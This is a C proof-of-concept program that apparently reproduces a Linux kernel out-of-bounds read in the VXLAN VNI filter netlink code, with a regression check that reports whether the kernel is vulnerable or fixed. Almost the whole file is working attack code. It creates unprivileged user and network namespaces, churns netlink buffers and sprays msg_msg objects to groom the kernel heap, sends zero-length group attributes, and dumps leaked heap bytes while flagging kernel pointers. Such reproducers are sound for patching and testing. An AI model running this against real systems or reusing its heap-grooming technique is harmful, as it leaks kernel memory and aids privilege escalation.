// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>
#include <net/if.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdint.h>

static int g_quiet_ack;

static int nlsock(void)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0) { perror("socket(NETLINK_ROUTE)"); exit(1); }
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { perror("bind"); exit(1); }
	return fd;
}

static int put_attr(char *buf, int off, int type, const void *data, int dlen)
{
	struct nlattr *a = (struct nlattr *)(buf + off);
	a->nla_type = type;
	a->nla_len  = NLA_HDRLEN + dlen;
	if (dlen) memcpy(buf + off + NLA_HDRLEN, data, dlen);
	return off + NLA_HDRLEN + NLA_ALIGN(dlen);
}
static int nest_start(char *buf, int off, int type)
{
	struct nlattr *a = (struct nlattr *)(buf + off);
	a->nla_type = type | NLA_F_NESTED;
	a->nla_len = 0;
	return off + NLA_HDRLEN;
}
static void nest_fix(char *buf, int hdr_off, int cur_off)
{
	((struct nlattr *)(buf + hdr_off))->nla_len = cur_off - hdr_off;
}

static int recv_ack(int fd, const char *what)
{
	char rbuf[8192];
	int n = recv(fd, rbuf, sizeof(rbuf), 0);
	if (n < 0) { perror("recv"); return -1; }
	struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
	if (nh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nh);
		if (e->error && !g_quiet_ack)
			fprintf(stderr, "[%s] netlink err %d (%s)\n", what, e->error, strerror(-e->error));
		return e->error;
	}
	return 0;
}

static int create_vxlan(int fd, const char *name)
{
	char buf[1024];
	memset(buf, 0, sizeof(buf));
	struct nlmsghdr *nh = (struct nlmsghdr *)buf;
	struct ifinfomsg *ifi;
	int off;

	nh->nlmsg_type  = RTM_NEWLINK;
	nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	nh->nlmsg_seq   = 1;
	nh->nlmsg_len   = NLMSG_LENGTH(sizeof(*ifi));
	ifi = (struct ifinfomsg *)NLMSG_DATA(nh);
	ifi->ifi_family = AF_UNSPEC;

	off = NLMSG_ALIGN(nh->nlmsg_len);
	off = put_attr(buf, off, IFLA_IFNAME, name, strlen(name) + 1);

	int linkinfo_off = off;
	int p = nest_start(buf, off, IFLA_LINKINFO);
	p = put_attr(buf, p, IFLA_INFO_KIND, "vxlan", strlen("vxlan") + 1);
	int infodata_off = p;
	int q = nest_start(buf, p, IFLA_INFO_DATA);
	unsigned char one = 1;
	q = put_attr(buf, q, IFLA_VXLAN_COLLECT_METADATA, &one, 1);
	q = put_attr(buf, q, IFLA_VXLAN_VNIFILTER, &one, 1);
	nest_fix(buf, infodata_off, q);
	nest_fix(buf, linkinfo_off, q);
	nh->nlmsg_len = q;

	struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
	if (sendto(fd, buf, nh->nlmsg_len, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
		perror("sendto NEWLINK"); return -1;
	}
	return recv_ack(fd, "RTM_NEWLINK vxlan");
}

#define TRIG_MSG_LEN	40

static int send_short_group(int fd, int ifindex, int vni, int group_len,
			    unsigned char first_byte)
{
	char buf[1024];
	memset(buf, 0, sizeof(buf));
	struct nlmsghdr *nh = (struct nlmsghdr *)buf;
	struct tunnel_msg *tmsg;
	int off;

	nh->nlmsg_type  = RTM_NEWTUNNEL;
	nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nh->nlmsg_seq   = 2;
	nh->nlmsg_len   = NLMSG_LENGTH(sizeof(*tmsg));
	tmsg = (struct tunnel_msg *)NLMSG_DATA(nh);
	tmsg->family  = PF_BRIDGE;
	tmsg->ifindex = ifindex;

	off = NLMSG_ALIGN(nh->nlmsg_len);
	int entry_off = off;
	int e = nest_start(buf, off, VXLAN_VNIFILTER_ENTRY);
	e = put_attr(buf, e, VXLAN_VNIFILTER_ENTRY_START, &vni, 4);

	struct nlattr *g = (struct nlattr *)(buf + e);
	g->nla_type = VXLAN_VNIFILTER_ENTRY_GROUP;
	g->nla_len  = NLA_HDRLEN + group_len;
	unsigned char gbytes[4] = { first_byte, 0x00, 0x00, 0x00 };
	if (group_len) memcpy(buf + e + NLA_HDRLEN, gbytes, group_len);

	int msg_end = e + NLA_HDRLEN + group_len;
	nest_fix(buf, entry_off, msg_end);
	nh->nlmsg_len = msg_end;

	struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
	if (sendto(fd, buf, nh->nlmsg_len, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
		perror("sendto NEWTUNNEL"); return -1;
	}
	return recv_ack(fd, "RTM_NEWTUNNEL short GROUP");
}

struct leakinfo {
	int nentry;
	int nmarker;
	int nheapptr;
};

#define REGRESSION_VNI	500

static void dump_tunnels(int fd, int ifindex, const unsigned char *marker,
			 int verbose, struct leakinfo *out)
{
	char buf[1024];
	memset(buf, 0, sizeof(buf));
	struct nlmsghdr *nh = (struct nlmsghdr *)buf;
	struct tunnel_msg *tmsg;

	nh->nlmsg_type  = RTM_GETTUNNEL;
	nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
	nh->nlmsg_seq   = 3;
	nh->nlmsg_len   = NLMSG_LENGTH(sizeof(*tmsg));
	tmsg = (struct tunnel_msg *)NLMSG_DATA(nh);
	tmsg->family  = PF_BRIDGE;
	tmsg->ifindex = ifindex;

	struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
	if (sendto(fd, buf, nh->nlmsg_len, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
		perror("sendto GETTUNNEL"); return;
	}

	for (;;) {
		char rbuf[16384];
		int n = recv(fd, rbuf, sizeof(rbuf), 0);
		if (n <= 0) break;
		struct nlmsghdr *r = (struct nlmsghdr *)rbuf;
		int done = 0;
		for (; NLMSG_OK(r, n); r = NLMSG_NEXT(r, n)) {
			if (r->nlmsg_type == NLMSG_DONE) { done = 1; break; }
			if (r->nlmsg_type == NLMSG_ERROR) { done = 1; break; }

			struct tunnel_msg *tm = (struct tunnel_msg *)NLMSG_DATA(r);
			int alen = r->nlmsg_len - NLMSG_LENGTH(sizeof(*tm));
			struct nlattr *a = (struct nlattr *)((char *)tm + NLMSG_ALIGN(sizeof(*tm)));
			for (; alen > 0 && (a->nla_len >= sizeof(*a)) && a->nla_len <= alen; ) {
				if ((a->nla_type & NLA_TYPE_MASK) == VXLAN_VNIFILTER_ENTRY) {

					struct nlattr *c = (struct nlattr *)((char *)a + NLA_HDRLEN);
					int clen = a->nla_len - NLA_HDRLEN;
					unsigned int vni = 0; unsigned char grp[4]; int have_grp = 0;
					for (; clen > 0 && c->nla_len >= sizeof(*c) && c->nla_len <= clen; ) {
						int t = c->nla_type & NLA_TYPE_MASK;
						if (t == VXLAN_VNIFILTER_ENTRY_START)
							vni = *(unsigned int *)((char *)c + NLA_HDRLEN);
						else if (t == VXLAN_VNIFILTER_ENTRY_GROUP) {
							memcpy(grp, (char *)c + NLA_HDRLEN, 4);
							have_grp = 1;
						}
						int adv = NLA_ALIGN(c->nla_len);
						clen -= adv;
						c = (struct nlattr *)((char *)c + adv);
					}
					if (have_grp && vni == REGRESSION_VNI) {
						printf("[*] regression: vni %u stored group = %02x %02x %02x %02x (expect 0a 00 00 00)\n",
						       vni, grp[0], grp[1], grp[2], grp[3]);
					} else if (have_grp) {
						uint32_t v = (uint32_t)grp[0] | ((uint32_t)grp[1] << 8) |
							     ((uint32_t)grp[2] << 16) | ((uint32_t)grp[3] << 24);
						const char *tag = "";
						out->nentry++;
						if (marker && !memcmp(grp, marker, 4)) {
							out->nmarker++;
							tag = "  <-- MARKER from a previously-freed netlink skb head (OOB read confirmed)";
						} else if ((v >> 28) == 0x8 || (v >> 28) == 0x9) {
							out->nheapptr++;
							tag = "  <-- KERNEL HEAP POINTER (low 32 bits of 0xffff8880_xxxxxxxx; heap-layout leak)";
						}
						if (verbose)
							printf("[LEAK] vni=%u ENTRY_GROUP bytes = %02x %02x %02x %02x  -> leaked u32 = 0x%08x%s\n",
							       vni, grp[0], grp[1], grp[2], grp[3], v, tag);
					}
				}
				int adv = NLA_ALIGN(a->nla_len);
				alen -= adv;
				a = (struct nlattr *)((char *)a + adv);
			}
		}
		if (done) break;
	}
}

#define CHURN_MSG_LEN	48
#define CHURN_N		600000
static const unsigned char MARKER[4] = { 0x41, 0x42, 0x43, 0x44 };

static void churn_marker_skbs(unsigned long n)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
	if (fd < 0) { perror("socket(NETLINK_USERSOCK)"); return; }

	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		perror("bind(USERSOCK)");

	char buf[CHURN_MSG_LEN];
	memset(buf, 0x2e, sizeof(buf));
	struct nlmsghdr *nh = (struct nlmsghdr *)buf;
	nh->nlmsg_len   = CHURN_MSG_LEN;
	nh->nlmsg_type  = NLMSG_NOOP;
	nh->nlmsg_flags = 0;
	nh->nlmsg_seq   = 0;
	nh->nlmsg_pid   = 0;
	memcpy(buf + TRIG_MSG_LEN, MARKER, 4);

	struct sockaddr_nl dst = { .nl_family = AF_NETLINK, .nl_pid = 0x7ffffffe };

	unsigned long sent = 0;
	for (unsigned long i = 0; i < n; i++) {
		if (sendto(fd, buf, sizeof(buf), MSG_DONTWAIT,
			   (struct sockaddr *)&dst, sizeof(dst)) < 0) {
			if (errno == ECONNREFUSED) { sent++; continue; }
			if (errno == EPERM) break;
		} else {
			sent++;
		}
	}
	fprintf(stderr, "[*] churned %lu marker skbs (%d B each)\n", sent, CHURN_MSG_LEN);
	close(fd);
}

#define SPRAY_N   400

#define MTEXT_LEN 456

struct msgbuf_big {
	long mtype;
	char mtext[MTEXT_LEN];
};

static int g_qids[SPRAY_N];

static void spray_msg(void)
{
	for (int i = 0; i < SPRAY_N; i++) {
		int q = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		g_qids[i] = q;
		if (q < 0) continue;
		struct msgbuf_big mb;
		mb.mtype = 1;
		memset(mb.mtext, 0x41, sizeof(mb.mtext));
		if (msgsnd(q, &mb, sizeof(mb.mtext), 0) < 0)
			perror("msgsnd");
	}
}

static void free_msg(void)
{
	struct msgbuf_big mb;
	for (int i = 0; i < SPRAY_N; i++) {
		if (g_qids[i] < 0) continue;

		msgrcv(g_qids[i], &mb, sizeof(mb.mtext), 0, IPC_NOWAIT | MSG_NOERROR);
	}
}

static void try_unpriv_ns(void)
{
	uid_t uid = getuid(), gid = getgid();
	if (uid == 0) {
		if (unshare(CLONE_NEWNET) < 0) perror("unshare(CLONE_NEWNET) [root]");
		return;
	}
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) { perror("unshare"); exit(1); }
	char m[64]; int f;
	f = open("/proc/self/setgroups", O_WRONLY); if (f >= 0) { write(f, "deny", 4); close(f); }
	f = open("/proc/self/uid_map", O_WRONLY); if (f >= 0) { int n = snprintf(m, sizeof(m), "0 %d 1", uid); write(f, m, n); close(f); }
	f = open("/proc/self/gid_map", O_WRONLY); if (f >= 0) { int n = snprintf(m, sizeof(m), "0 %d 1", gid); write(f, m, n); close(f); }
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	try_unpriv_ns();
	int fd = nlsock();

	const char *devname = "vxlan0";
	if (create_vxlan(fd, devname) != 0)
		fprintf(stderr, "[!] vxlan create may have failed (continuing)\n");
	int ifindex = if_nametoindex(devname);
	fprintf(stderr, "[*] %s ifindex = %d\n", devname, ifindex);
	if (!ifindex) { fprintf(stderr, "[!] no ifindex\n"); return 1; }

	int accepted = 0, rejected = 0, last_err = 0;

	fprintf(stderr, "[*] phase A: churning marker skbs then 0-byte GROUP RTM_NEWTUNNEL...\n");
	g_quiet_ack = 1;
	for (int round = 0; round < 4; round++) {
		churn_marker_skbs(CHURN_N / 4);
		for (int vni = 1 + round * 50; vni <= 50 + round * 50; vni++) {
			int r = send_short_group(fd, ifindex, vni, 0, 0x00);
			if (r == 0) accepted++; else { rejected++; last_err = r; }
		}
	}

	fprintf(stderr, "[*] phase B: grooming (msg_msg spray) + 0-byte GROUP OOB read across VNIs...\n");
	for (int vni = 201; vni <= 400; vni++) {
		spray_msg();
		free_msg();
		int r = send_short_group(fd, ifindex, vni, 0, 0x00);
		if (r == 0) accepted++; else { rejected++; last_err = r; }
	}
	g_quiet_ack = 0;

	int good = send_short_group(fd, ifindex, REGRESSION_VNI, 4, 0x0a);
	printf("[*] regression: full 4-byte ENTRY_GROUP (10.0.0.0) on vni 500 -> %s (%d)\n",
	       good == 0 ? "ACCEPTED" : "REJECTED", good);

	fprintf(stderr, "[*] dumping stored remote groups (RTM_GETTUNNEL)...\n");
	struct leakinfo li = { 0 };
	dump_tunnels(fd, ifindex, MARKER, 1, &li);

	printf("[*] 0-length ENTRY_GROUP RTM_NEWTUNNEL: accepted=%d rejected=%d (last err %d %s)\n",
	       accepted, rejected, last_err, last_err ? strerror(-last_err) : "-");
	printf("[*] VNI entries holding out-of-bounds bytes = %d "
	       "(marker hits=%d, heap-pointer-shaped=%d)\n",
	       li.nentry, li.nmarker, li.nheapptr);

	if (accepted > 0 && li.nentry > 0)
		printf("[RESULT] VULNERABLE: kernel accepted a 0-length VXLAN_VNIFILTER_ENTRY_GROUP, "
		       "read 4 bytes past it, and returned %d dword(s) of adjacent kernel heap "
		       "memory to userspace (%d confirmed via marker)\n",
		       li.nentry, li.nmarker);
	else if (accepted == 0 && li.nentry == 0)
		printf("[RESULT] FIXED: every short VXLAN_VNIFILTER_ENTRY_GROUP was rejected "
		       "(err %d %s); no out-of-bounds read, nothing leaked\n",
		       last_err, last_err ? strerror(-last_err) : "-");
	else if (accepted > 0)
		printf("[RESULT] VULNERABLE (read performed, nothing observable): kernel accepted %d "
		       "0-length ENTRY_GROUP attributes, so nla_get_in_addr() read 4 bytes past a "
		       "0-byte payload; the adjacent bytes happened to be zero this run\n", accepted);
	else
		printf("[RESULT] INCONCLUSIVE: accepted=%d entries=%d\n", accepted, li.nentry);

	fprintf(stderr, "[*] done\n");
	return 0;
}
